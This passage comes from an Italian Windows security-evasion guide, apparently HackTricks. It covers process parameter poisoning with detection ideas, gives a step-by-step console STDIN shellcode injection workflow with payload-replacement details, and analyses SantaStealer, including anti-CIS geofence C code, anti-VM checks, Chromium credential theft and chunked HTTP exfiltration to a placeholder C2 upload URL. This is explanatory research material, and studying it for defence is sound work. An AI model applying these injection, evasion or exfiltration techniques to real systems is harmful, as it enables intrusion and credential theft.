Un secondo stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, impostato su `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto con un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri di processo**
- tale modifica dei permessi seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote di `PEB` e poi di `RTL_USER_PROCESS_PARAMETERS`
- valori insolitamente lunghi o ad alta entropia di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creazione del processo

### Note

- P3 è un **metodo di trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato richiede comunque una modifica dei permessi per consentire l'esecuzione e un metodo per reindirizzare l'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato preso in considerazione dagli autori, ma scartato perché al suo interno ricorre a primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Console STDIN pipe injection

Un processo figlio di una console interattiva può essere usato anche come **primitiva di trasferimento del payload**. L'injector reindirizza lo standard input del processo figlio a una pipe e invia un marker seguito da shellcode. Dopo che il programma della console legge i dati nella propria memoria privata, l'injector individua quel buffer, lo rende eseguibile e reindirizza un thread del processo figlio verso di esso. Ciò evita `VirtualAllocEx` e `WriteProcessMemory`, ma si tratta comunque di process injection, non di un bypass EDR generico.<sup>[[41]](#references)</sup>

Nonostante la descrizione "named-pipe", l'implementazione di riferimento chiama `CreatePipe`, che crea una **anonymous pipe**. Windows implementa internamente le anonymous pipe con oggetti pipe dotati di nomi univoci, ma la PoC non seleziona un percorso `\\.\pipe\<name>` né chiama `CreateNamedPipe`. Crea handle ereditabili con un descrittore di sicurezza predefinito, inserisce l'handle di lettura in `STARTUPINFO.hStdInput`, imposta `STARTF_USESTDHANDLES` e avvia un nuovo processo figlio abilitando l'ereditarietà degli handle. Pertanto, questa PoC avvia l'eseguibile console fornito; non collega la pipe a un processo esistente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flusso di lavoro di riferimento

L'implementazione usa la seguente catena:<sup>[[41]](#references)</sup>

1. Crea coppie di anonymous pipe per `STDIN` e `STDOUT` del processo figlio. Disabilita l'ereditarietà sui due handle lato processo padre e chiude nel processo padre i duplicati lato processo figlio dopo la creazione del processo.
2. Avvia un eseguibile interattivo, come `netsh.exe` o `nslookup.exe`, con `CREATE_NEW_CONSOLE`. Il processo figlio eredita gli handle standard reindirizzati.
3. Invia l'intero array binario `rawData` tramite `WriteFile` attraverso l'handle `STDIN` lato processo padre. Il programma della console consuma i byte e lascia una copia in una delle proprie regioni private allocate.
4. Esamina lo spazio degli indirizzi del processo figlio con `VirtualQueryEx`, legge le regioni candidate `MEM_PRIVATE` con `ReadProcessMemory` e cerca il marker all'inizio di `rawData`.
5. Modifica i permessi del buffer individuato in `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Individua il thread principale, lo sospende, imposta `RIP` su `found_address + 0x19` con `NtSetContextThread` e lo riprende.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L'implementazione fornita è specifica per x64: modifica `CONTEXT.Rip` e il payload incorporato è shellcode x64. `rawData` inizia con un marker di 25 byte, quindi i byte eseguibili iniziano all'offset esadecimale `0x19`. Quando sostituisci il payload, mantieni questa struttura oppure aggiorna insieme marker, vettore di ricerca, dimensione dell'array e offset di esecuzione. I commenti nel codice indicano inoltre `0x0A`, `0x0D` e `0x1A` come caratteri non validi. Questo workflow non modifica il token né i privilegi del processo figlio.<sup>[[41]](#references)</sup>

Per piccoli helper nativi e pattern di compilazione dei payload, vedi [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (alias BluelineStealer) mostra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Controllo del layout della tastiera e ritardo per sandbox

- Un flag di configurazione (`anti_cis`) elenca i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se trova un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, evitando così di attivarsi nelle aree geografiche escluse e lasciando al contempo una traccia utile per il threat hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica `check_antivm` multilivello

- La variante A scorre l’elenco dei processi, calcola per ogni nome un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (numero minimo di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali attorno alle attese per individuare il single-stepping. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un helper per le credenziali di Chromium, che viene scritto su disco oppure mappato manualmente in memoria; in modalità fileless risolve autonomamente importazioni/rilocazioni, così non vengono creati artefatti dell’helper.
- L’helper contiene una DLL di secondo stadio cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective con direct syscall per iniettarsi in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.


### Raccolta modulare in memoria ed esfiltrazione HTTP a chunk

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file dopo una finestra di attesa di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz`, collegata staticamente, come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e invia l’archivio in chunk da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, simulando un boundary `multipart/form-data` di un browser (`----WebKitFormBoundary***`). Ogni chunk include `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` facoltativo; l’ultimo chunk aggiunge `complete: true` per comunicare al C2 che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: Module Stomping di precisione](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stack di chiamate: niente più sconti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing dello stack di chiamate](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena d’infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompere la protezione di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Dietro la cortina di Pure: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arriva in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione della Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracing delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Bella Addormentata: mettere Adaptix a riposo con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Bella Addormentata II: CFG, CET e spoofing dello stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento dell’attesa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere l’ETW di Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice di supporto MDSec per Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creazione di funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Codice sorgente di InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funzione CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creazione di un processo figlio con input e output reindirizzati](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
